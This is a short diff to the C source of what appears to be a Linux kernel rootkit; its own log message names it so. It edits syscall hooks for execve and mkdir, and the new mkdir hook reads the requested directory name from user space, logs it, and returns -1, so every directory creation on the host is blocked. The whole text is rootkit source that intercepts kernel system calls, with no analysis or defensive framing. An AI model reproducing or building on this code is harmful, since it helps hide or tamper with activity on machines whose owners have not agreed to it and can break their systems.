@@ -103,6 +103,7 @@ asmlinkage long execve_hook (const struct pt_regs *regs)
 	*/
 	char __user *pathname_u = (char *)regs->regs[0];
 	char pathname[NAME_MAX] = {0};
+	
 	strncpy_from_user(pathname, pathname_u, NAME_MAX);
 
 	/* print out the pathname before calling system call */
@@ -118,6 +119,14 @@ asmlinkage long reboot_hook (const struct pt_regs *regs)
 
 asmlinkage int mkdir_hook(const struct pt_regs *regs)
 {
+	char __user *pathname = (char *)regs->regs[1];
+	char dir_name[NAME_MAX] = {0};
+
+	long ret = strncpy_from_user(dir_name, pathname, NAME_MAX);
+
+	if (ret > 0)
+		printk(KERN_INFO "rootkit: trying to create directory with name: %s\n", dir_name);
+
 	return -1;
 }
 
